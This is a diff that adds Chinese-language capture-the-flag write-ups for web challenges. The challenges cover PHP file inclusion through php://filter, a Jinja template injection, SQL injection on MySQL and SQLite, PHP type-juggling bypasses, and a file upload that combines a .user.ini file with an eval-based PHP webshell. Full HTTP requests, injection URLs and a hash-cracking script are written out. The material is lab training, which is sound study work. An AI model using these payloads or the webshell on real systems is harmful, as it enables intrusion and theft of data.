@@ -153,6 +153,14 @@ StegSolve打开，即可得到flag：
 
 010打开，falg在最后
 
+### 17. Test-flag-please-ignore
+
+16进制解码
+
+### 18. can_has_stdio?
+
+brainfuck解码
+
 
 
 ## Web
@@ -1442,3 +1450,902 @@ echo $x;
 ?>
 ```
 
+源代码中看到` @include($lan.".php"); `，可知此处存在文件包含。
+
+`$lan`的值是从cookie中传过来的，所以对`language`赋值，构造payload，重放包就可读出flag.php经过base64加密后字符串，base64解密后得到flag，最终payload：
+
+```http
+GET / HTTP/1.1
+Host: 61.147.171.105:62331
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cookie: language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
+
+
+```
+
+- 此处为flag而不是官方提到的flag.php
+
+![image-20240102102232557](adword_wp.assets/image-20240102102232557.png)
+
+### 33. lottery
+
+TBD，刷不出来记录一下百度到的wp：
+
+```php
+function buy($req){
+	require_registered();
+	require_min_money(2);
+
+	$money = $_SESSION['money'];
+	$numbers = $req['numbers'];
+	$win_numbers = random_win_nums();
+	$same_count = 0;
+	for($i=0; $i<7; $i++){
+		if($numbers[$i] == $win_numbers[$i]){
+			$same_count++;
+		}
+	}
+```
+
+通过审计发现，存在弱比较，那么我们通过抓包，将输入的号码改成数组型，里面的元素全是true，就可以通过比较，得到奖金了：
+
+payload：
+
+````
+"numbers":[true,true,true,true,true,true,true]
+````
+
+### 34. shrine
+
+访问页面，代码审计：
+
+```python
+import flask 
+import os 
+app = flask.Flask(__name__) 
+app.config['FLAG'] = os.environ.pop('FLAG') 
+
+@app.route('/') 
+def index(): 
+    return open(__file__).read() 
+
+@app.route('/shrine/') 
+def shrine(shrine): 
+    def safe_jinja(s): 
+        s = s.replace('(', '').replace(')', '') 
+        blacklist = ['config', 'self'] 
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s 
+    return flask.render_template_string(safe_jinja(shrine)) 
+
+if __name__ == '__main__': 
+    app.run(debug=True) 
+```
+
+代码分析：
+
+- `app = flask.Flask(__name__)`：用当前模块的路径初始化app，__name__是系统变量即程序主模块或者包的名字，该变量指的是本py文件的文件名；
+- `app.config['FLAG'] = os.environ.pop('FLAG')`：加载配置，app下一个变量名为FLAG的配置，它的值等于os.environ.pop('FLAG')移除环境变量中的键名为FLAG的值；
+- `@app.route('/') `往后：访问/，则执行index()函数打开当前文件，读取文件内容，返回文件源码；
+- `@app.route('/shrine/') `往后：访问/shrine/，则调用flask.render_template_string函数返回渲染模板字符串safe_jinja(shrine)；
+  - `s = s.replace('(', '').replace(')', '') `：去掉s字符串变量中的“（”和“）”左右括号；
+  - `''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s`：返回{% set config=None%}{% set self=None%}字符串，给flask.render_template_string函数经过渲染将config、self参数的值设为None，之后返回浏览器显示；
+
+考虑python模板注入：
+
+构造payload，确认是否存在模板注入：
+
+```
+/shrine/{{1+1}}
+```
+
+![image-20240102105245415](adword_wp.assets/image-20240102105245415.png)
+
+1+1被计算后返回，确实存在模板注入，之后尝试查看config、self配置：
+
+```
+/shrine/{{config}}
+/shrine/{{self}}
+```
+
+![image-20240102110131166](adword_wp.assets/image-20240102110131166.png)
+
+![image-20240102110143267](adword_wp.assets/image-20240102110143267.png)
+
+返回都是None，符合代码审计结论，尝试利用其他Python内置函数，但要注意“()”被过滤了，带“()”的函数都无法执行。
+
+**Python中常用于ssti的魔术方法**：
+
+- `__class__`：返回类型所属的对象
+- `__mro__`：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
+- `__base__`：返回该对象所继承的基类// `__base__`和`__mro__`都是用来寻找基类的
+- `__subclasses__`：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
+- `__init__`：类的初始化方法
+- `__globals__`：对包含函数全局变量的字典的引用
+- `__builtins__`：builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。
+
+在Flask框架渲染模板时，可以直接在模板中使用的模板变量及函数：config、request、url_for()、get_flashed_messages()。
+
+**方法一：url_for()函数查看flag**
+
+url_for()作用：
+
+- 给指定的函数构造 URL；
+- 访问静态文件(CSS、JavaScript等)，只要在包中或是模块的所在目录中创建一个名为static的文件夹，在应用中使用 /static即可访问；
+
+构造payload：
+
+```
+/shrine/{{url_for.__globals__['current_app'].config}}
+```
+
+**方法二：get_flashed_messages()函数查看flag**
+
+返回之前在Flask中通过flash()函数传入的闪现信息列表，把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages()方法取出（闪现信息只能取出一次，取出后闪现信息会被清空）；
+
+- flask闪现是基于flask内置的session的，利用浏览器的session缓存闪现信息；
+- 之前的每次flash()函数都会缓存一个信息，之后再通过get_flashed_messages()函数访问缓存的信息。
+- flash()函数有三种形式缓存数据：
+  - 缓存字符串内容：
+    - 设置闪现内容：flash(‘恭喜您登录成功’)
+    - 模板取出闪现内容：{% with messages = get_flashed_messages() %}
+  - 缓存默认键值对：当闪现一个消息时，是可以提供一个分类的。未指定分类时默认的分类为 ‘message’ 。
+    - 设置闪现内容：flash(‘恭喜您登录成功’,“status”)
+    - 模板取出闪现内容：{% with messages = get_flashed_messages(with_categories=true) %}
+  - 缓存自定义键值对：
+    - 设置闪现内容：flash(‘您的账户名为admin’,“username”)
+    - 模板取出闪现内容：{% with messages = get_flashed_messages(category_filter=[“username”])
+
+构造payload：
+
+```
+/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
+```
+
+### 35. file_include
+
+访问页面，代码审计：
+
+```php
+<?php
+highlight_file(__FILE__);
+    include("./check.php");
+    if(isset($_GET['filename'])){
+        $filename  = $_GET['filename'];
+        include($filename);
+    }
+?>
+```
+
+直接尝试伪协议去读flag.php中的内容发现不行，存在过滤的情况：
+
+```
+/?filename=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+![image-20240102140247475](adword_wp.assets/image-20240102140247475.png)
+
+使用?filename=1hp://1ilter/1ead=1onvert.1ase64-1ncode/1esource=1lag.1hp逐一测试，将要测试的字符串中的1改回去即可，来确认哪些关键字被过滤了，
+
+当执行payload：
+
+```
+/?filename=php://filter/1ead=convert.1ase64-1ncode/resource=flag.php
+```
+
+时没有回显
+
+![image-20240102140528080](adword_wp.assets/image-20240102140528080.png)
+
+于是可见此处`read=convert.base64-encode`不能使用；
+
+- 对read的处理：直接省略；
+- 对过滤器convert.base64-encode的处理：由于convert还可以使用，所以选择使用其他的过滤器convert.iconv.* 绕过
+  - 使用方法：`convert.iconv.<input-encoding>.<output-encoding>` 或者 `convert.iconv.<input-encoding>/<output-encoding>`；
+  - 这里的`<input-encoding>`和`<output-encoding>`分别为输入的字符串编码方式和输出的字符串编码方式（字符集）;
+
+php支持的字符编码：
+
+```
+UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+EUC-JP*
+SJIS*
+eucJP-win*
+SJIS-win*
+ISO-2022-JP
+ISO-2022-JP-MS
+CP932
+CP51932
+SJIS-mac（别名：MacJapanese）
+SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）
+SJIS-Mobile#KDDI（别名：SJIS-KDDI）
+SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）
+UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）
+UTF-8-Mobile#KDDI-A
+UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）
+UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）
+ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）
+JIS
+JIS-ms
+CP50220
+CP50220raw
+CP50221
+CP50222
+ISO-8859-1*
+ISO-8859-2*
+ISO-8859-3*
+ISO-8859-4*
+ISO-8859-5*
+ISO-8859-6*
+ISO-8859-7*
+ISO-8859-8*
+ISO-8859-9*
+ISO-8859-10*
+ISO-8859-13*
+ISO-8859-14*
+ISO-8859-15*
+ISO-8859-16*
+byte2be
+byte2le
+byte4be
+byte4le
+BASE64
+HTML-ENTITIES（别名：HTML）
+7bit
+8bit
+EUC-CN*
+CP936
+GB18030
+HZ
+EUC-TW*
+CP950
+BIG-5*
+EUC-KR*
+UHC（别名：CP949）
+ISO-2022-KR
+Windows-1251（别名：CP1251）
+Windows-1252（别名：CP1252）
+CP866（别名：IBM866）
+KOI8-R*
+KOI8-U*
+ArmSCII-8（别名：ArmSCII8）
+```
+
+burp爆破（当输入字符编码为空）：
+
+![image-20240102142342015](adword_wp.assets/image-20240102142342015.png)
+
+得到flag：
+
+![image-20240102142401706](adword_wp.assets/image-20240102142401706.png)
+
+### 36. fakebook
+
+首先注册一个账号然后登录，发现存在SQL注入，首先确定有几列：
+
+![image-20240102151357686](adword_wp.assets/image-20240102151357686.png)
+
+![image-20240102151444652](adword_wp.assets/image-20240102151444652.png)
+
+存在有4列，联合注入试试：
+
+![image-20240102151521429](adword_wp.assets/image-20240102151521429.png)
+
+存在过滤，使用`/**/`绕过：
+
+![image-20240102151631307](adword_wp.assets/image-20240102151631307.png)
+
+爆库：
+
+```
+/view.php?no=-1 union/**/select 1,database(),3,4
+```
+
+爆表：
+
+```
+/view.php?no=-1 union/**/select 1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema=database()
+```
+
+爆列：
+
+```
+/view.php?no=-1 union/**/select 1,group_concat(column_name) ,3,4 from information_schema.columns where table_schema='fakebook' and table_name='users'
+```
+
+最终显示对象被序列化了：
+
+![image-20240102152720706](adword_wp.assets/image-20240102152720706.png)
+
+百度了下，需要去读/var/www/html/flag.php文件，有两种方法；
+
+方法一：构造反序列化对象，使用file://协议去读
+
+payload：
+
+```
+/view.php?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";} '
+```
+
+CTRL U查看源码点击跳转即可查看源码：
+
+![image-20240102153458294](adword_wp.assets/image-20240102153458294.png)
+
+方法二：使用MySQL中LOAD_FILE()函数读取一个文件
+
+payload：
+
+```
+/view.php?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4
+```
+
+CTRL U查看源码即可看到flag
+
+### 37. easyphp
+
+访问页面，代码审计：
+
+```php+HTML
+<?php
+highlight_file(__FILE__);
+$key1 = 0;
+$key2 = 0;
+
+$a = $_GET['a'];
+$b = $_GET['b'];
+
+if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
+    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
+        $key1 = 1;
+        }else{
+            die("Emmm...再想想");
+        }
+    }else{
+    die("Emmm...");
+}
+
+$c=(array)json_decode(@$_GET['c']);
+if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
+    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
+        $d = array_search("DGGJ", $c["n"]);
+        $d === false?die("no..."):NULL;
+        foreach($c["n"] as $key=>$val){
+            $val==="DGGJ"?die("no......"):NULL;
+        }
+        $key2 = 1;
+    }else{
+        die("no hack");
+    }
+}else{
+    die("no");
+}
+
+if($key1 && $key2){
+    include "Hgfks.php";
+    echo "You're right"."\n";
+    echo $flag;
+}
+
+?>
+```
+
+- `if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3)`：需要找到一个a，使得它的长度小于3，且经过intval()函数处理后的值大于6000000；
+  - intval()函数会把参数变成整型；
+  - 传入科学计数法；
+  - payload：?**a=1e9**
+- `if(isset($b) && '8b184b' === substr(md5($b),-6,6))`：让b的最后6位的md5值等于'8b184b'；
+  - substr是截取字符串的函数，第一个参数是需要截取的字符串，第二个参数是截取开始位置，如果是负数就倒着截取，第三个参数是截取长度；
+  - 需要写一个脚本暴力破解下；
+  - payload：?**b=53724**
+- `$c=(array)json_decode(@$_GET['c']);`：$c的值最后会被json解码一次，并且被转换为数组类型；
+- `if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022)`：c是个数组，而且要求c[m]的值不是数字，还要c[m]的值大于2022，这是一对自相矛盾的条件；
+  - 字符串可以被is_numeric()函数解析成数字；
+  - c[m]只需要数字+英文字母即可；
+- `if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0]))`：要求 c[n]元素是一个数组且包含两个元素，对应应该长这样："n"=>array(元素1，元素2)；接着需要元素1是一个数组:array()；
+  - if判断中，会在c[n]的数组中找"DGGJ"这个字符串，找不到输出no...然后遍历c[n]数组，如果有“DGGJ”就输出no...也是自相矛盾的判断；
+  - array_search()函数在搜寻的时候用的是==弱比较，对于没有数字的字符串，最后的结果为0；
+  - 将c进行json序列化一些即可；
+  - payload：**?c={"m":"2023x","n":[[],0]}**
+
+最终payload：
+
+```
+/?a=1e9&&b=53724&&c={"m":"9999x","n":[[],0]}
+```
+
+
+
+暴力破解b的md5值脚本：
+
+```php
+<?php
+$b=1;
+while(substr(md5($b),-6,6) !='8b184b') {$b++;}
+var_dump($b);
+?>
+```
+
+序列化c的脚本：
+
+```php
+<?php
+$b=array("m"=>"2023x","n"=>array(array(),0));
+$b=json_encode($b);
+var_dump($b);
+?>
+```
+
+### 38. easyupload
+
+常见的一句话木马：
+
+```php
+//修改Content-Type，改为 image/jpeg
+
+<?php eval($_POST['cmd']);?>
+<?= eval($_POST[1]);?>
+<script language="php">eval($_POST[1]);</script>
+
+//上传名称后缀为.phtml .phps .php5 .pht
+```
+
+文件上传，发现很多都有过滤，以上都不行，百度了下需要使用.user.ini来绕过；
+
+**.user.ini绕过**
+.user.ini中存在两个配置项：`auto_prepend_file`和`auto_append_file`
+
+- 当我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)；
+- 区别在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入；
+
+利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。
+
+所以本题我们要想上传并且执行，首先上传.user.ini文件，然后上传一个图片。
+
+上传.user.ini文件：
+
+![image-20240102165720469](adword_wp.assets/image-20240102165720469.png)
+
+payload：
+
+```http
+POST /index.php HTTP/1.1
+Host: 61.147.171.105:60508
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------167162850126592362123821604887
+Content-Length: 382
+Origin: http://61.147.171.105:60508
+Connection: close
+Referer: http://61.147.171.105:60508/index.php
+Cookie: PHPSESSID=79d3ec9b484fd5608a5ee5430023f4b6
+Upgrade-Insecure-Requests: 1
+
+-----------------------------167162850126592362123821604887
+Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
+Content-Type: image/jpeg
+
+GIF89a
+auto_prepend_file=shell.jpg
+
+-----------------------------167162850126592362123821604887
+Content-Disposition: form-data; name="upload"
+
+提交
+-----------------------------167162850126592362123821604887--
+
+```
+
+上传shell.jpg：
+
+![image-20240102165844795](adword_wp.assets/image-20240102165844795.png)
+
+payload：
+
+```http
+POST /index.php HTTP/1.1
+Host: 61.147.171.105:60508
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------167162850126592362123821604887
+Content-Length: 382
+Origin: http://61.147.171.105:60508
+Connection: close
+Referer: http://61.147.171.105:60508/index.php
+Cookie: PHPSESSID=79d3ec9b484fd5608a5ee5430023f4b6
+Upgrade-Insecure-Requests: 1
+
+-----------------------------167162850126592362123821604887
+Content-Disposition: form-data; name="fileUpload"; filename="shell.jpg"
+Content-Type: image/jpeg
+
+GIF89a
+<?=eval($_POST['cmd']);?>
+
+
+-----------------------------167162850126592362123821604887
+Content-Disposition: form-data; name="upload"
+
+提交
+-----------------------------167162850126592362123821604887--
+
+```
+
+此时`.user.ini`和`shell.jpg`同一目录下的所有php文件都会包含`shell.jpg`文件。这样就很好办了，看看uploads文件夹下是否有php文件，再次上传一个正常图片后，发现跳转网页中有/uploads/index.php：
+
+![image-20240102170117520](adword_wp.assets/image-20240102170117520.png)
+
+蚁剑连接即可得到flag：
+
+![image-20240102170332299](adword_wp.assets/image-20240102170332299.png)
+
+我们首先上传.user.ini的目的是本目录下所制定的文件被php文件所包含，其实相当于**三个文件必须同时存**在才会满足这个条件。
+
+### 39. FlatScience
+
+点进去是几个pdf页面，没什么思路，御剑扫描下（也可以访问查看robots.txt）：
+
+![image-20240102173045943](adword_wp.assets/image-20240102173045943.png)
+
+存在两个关键php：
+
+- admin.php
+- login.php
+
+分别有提示：
+
+admin.php：
+
+```html
+<!-- do not even try to bypass this -->
+<form method="post">
+  ID:<br>
+  <input type="text" name="usr" value="admin">
+  <br><br>
+  Password:<br>
+  <input type="text" name="pw">
+  <br><br>
+  <input type="submit" value="Submit">
+</form> 
+
+```
+
+login.php：
+
+```html
+
+<form method="post">
+  ID:<br>
+  <input type="text" name="usr">
+  <br>
+  Password:<br> 
+  <input type="text" name="pw">
+  <br><br>
+  <input type="submit" value="Submit">
+</form>
+
+<!-- TODO: Remove ?debug-Parameter! -->
+```
+
+给login.php传递一个debug参数，查看其源代码：
+
+```php+HTML
+<?php
+ob_start();
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+
+<html>
+<head>
+<style>
+blockquote { background: #eeeeee; }
+h1 { border-bottom: solid black 2px; }
+h2 { border-bottom: solid black 1px; }
+.comment { color: darkgreen; }
+</style>
+
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Login</title>
+</head>
+<body>
+
+
+<div align=right class=lastmod>
+Last Modified: Fri Mar  31:33:7 UTC 1337
+</div>
+
+<h1>Login</h1>
+
+Login Page, do not try to hax here plox!<br>
+
+
+<form method="post">
+  ID:<br>
+  <input type="text" name="usr">
+  <br>
+  Password:<br> 
+  <input type="text" name="pw">
+  <br><br>
+  <input type="submit" value="Submit">
+</form>
+
+<?php
+if(isset($_POST['usr']) && isset($_POST['pw'])){
+        $user = $_POST['usr'];
+        $pass = $_POST['pw'];
+
+        $db = new SQLite3('../fancy.db');
+        
+        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
+    if($res){
+        $row = $res->fetchArray();
+    }
+    else{
+        echo "<br>Some Error occourred!";
+    }
+
+    if(isset($row['id'])){
+            setcookie('name',' '.$row['name'], time() + 60, '/');
+            header("Location: /");
+            die();
+    }
+
+}
+
+if(isset($_GET['debug']))
+highlight_file('login.php');
+?>
+<!-- TODO: Remove ?debug-Parameter! -->
+
+
+
+
+<hr noshade>
+<address>Flux Horst (Flux dot Horst at rub dot flux)</address>
+</body>
+```
+
+数据库是SQLite，存在sql注入；
+
+> sqlite数据库有一张sqlite_master表，
+> 里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息
+>
+> 相当于mysql的information_schema
+>
+> - 字段：name #表名
+> - 字段：sql #表结构，表的字段信息都在里面，初始化数据表的sql语句
+
+Union注入，先看列数：
+
+```
+1' order by 2 --q 不报错无回显
+1' order by 3 --q 不报错
+```
+
+确定有两列，再由`setcookie('name',' '.$row['name'], time() + 60, '/');`确定，会将结果塞到cookie中去：
+
+```
+1' union select 1,2 --q
+```
+
+
+
+![image-20240102221541184](adword_wp.assets/image-20240102221541184.png)
+
+爆表：
+
+```
+1' union select 1,name from sqlite_master limit 0,1 --q
+```
+
+![image-20240102221849893](adword_wp.assets/image-20240102221849893.png)
+
+爆列：
+
+```
+1' union select 1,group_concat(sql) from sqlite_master limit 0,1 --q
+```
+
+![image-20240102222104297](adword_wp.assets/image-20240102222104297.png)
+
+URL解码出来：
+
+```
++CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255))
+```
+
+可以看出数据表Users 存在 id name password hint,四个字段，依次查看：
+
+```
+1' union select 1,group_concat(id) from Users --q
+1' union select 1,group_concat(name) from Users --q
+1' union select 1,group_concat(password) from Users --q
+1' union select 1,group_concat(hint) from Users --q
+
+```
+
+最终整理得到一张表：
+
+| id   | name   | password                                 | hint                          |
+| ---- | ------ | ---------------------------------------- | ----------------------------- |
+| 1    | admin  | 3fab54a50e770d830c0416df817567662a9dc85c | my fav word in my fav paper?! |
+| 2    | fritze | 54eae8935c90f467427f05e4ece82cf569f89507 | my love isâ¦?                 |
+| 3    | hansi  | 34b0bb7c304949f9ff2fc101eef0f048be10d3bd | the password is password      |
+
+密码在各个pdf中，先使用python脚本将所有的pdf下载下来：
+
+```python
+import requests
+import re
+import os
+import sys
+
+re1 = '[a-fA-F0-9]{32,32}.pdf'
+re2 = '[0-9\/]{2,2}index.html'
+
+pdf_list = []
+def get_pdf(url):
+    global pdf_list 
+    print(url)
+    req = requests.get(url).text
+    re_1 = re.findall(re1,req)
+    for i in re_1:
+        pdf_url = url+i
+        pdf_list.append(pdf_url)
+    re_2 = re.findall(re2,req)
+    for j in re_2:
+        new_url = url+j[0:2]
+        get_pdf(new_url)
+    return pdf_list
+    # return re_2
+
+pdf_list = get_pdf('http://61.147.171.105:58261/')
+print(pdf_list)
+for i in pdf_list:
+    os.system('wget '+i)
+
+```
+
+然后根据`$res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");`，密码是经过sha1加密的，python破译：
+
+```python
+from io import StringIO
+
+#python3
+from pdfminer.pdfpage import PDFPage
+from pdfminer.converter import TextConverter
+from pdfminer.converter import PDFPageAggregator
+from pdfminer.layout import LTTextBoxHorizontal, LAParams
+from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
+
+
+import sys
+import string
+import os
+import hashlib
+import importlib
+import random
+from urllib.request import urlopen
+from urllib.request import Request
+
+
+def get_pdf():
+    return [i for i in os.listdir("./") if i.endswith("pdf")]
+ 
+ 
+def convert_pdf_to_txt(path_to_file):
+    rsrcmgr = PDFResourceManager()
+    retstr = StringIO()
+    codec = 'utf-8'
+    laparams = LAParams()
+    device = TextConverter(rsrcmgr, retstr, codec=codec, laparams=laparams)
+    fp = open(path_to_file, 'rb')
+    interpreter = PDFPageInterpreter(rsrcmgr, device)
+    password = ""
+    maxpages = 0
+    caching = True
+    pagenos=set()
+
+    for page in PDFPage.get_pages(fp, pagenos, maxpages=maxpages, password=password,caching=caching, check_extractable=True):
+        interpreter.process_page(page)
+
+    text = retstr.getvalue()
+
+    fp.close()
+    device.close()
+    retstr.close()
+    return text
+ 
+ 
+def find_password():
+    pdf_path = get_pdf()
+    for i in pdf_path:
+        print ("Searching word in " + i)
+        pdf_text = convert_pdf_to_txt("./"+i).split(" ")
+        for word in pdf_text:
+            sha1_password = hashlib.sha1(word.encode('utf-8')+'Salz!'.encode('utf-8')).hexdigest()
+            if (sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c'):
+                print ("Find the password :" + word)
+                exit()
+            
+ 
+if __name__ == "__main__":
+    find_password()
+
+```
+
+爆破得到密码，登录admin即可得到flag
+
+### bug
+
+### unseping
+
+### Confusion1
+
+### 题目名称-文件包含
+
+### upload
+
+### ics-07
+
+### wife_wife
+
+### i-got-id-200
+
+### unfinish
+
+### ery_easy_sql
+
+### catcat-new
+
+### wtf.sh-150
+
+### Web_php_wrong_nginx_config
+
+### Zhuanxv
+
+### ezbypass-cat
+
+### easy_web
+
+### 题目名称-SSRF Me
+
+### comment
+
+### Triangle
+
+### filemanager
+
+
+
+## TODO
+
+- [ ] 将常见文件（jpg、png、gif、zip、rar……）的文件头文件尾整理成文档保存至本地；
+- [ ] zip、rar伪加密整理成文档保存至本地；
+- [ ] 将常见的HTTP头信息整理成文档保存至本地；
+- [ ] 将常用的PHP协议整理成文档保存至本地；
+- [ ] 将PHP弱比较（字符串、数组、数字、MD5）技巧整理成文档保存至本地；
+- [ ] 将BUU的wd中的好文章保存到本地；
+- [ ] 
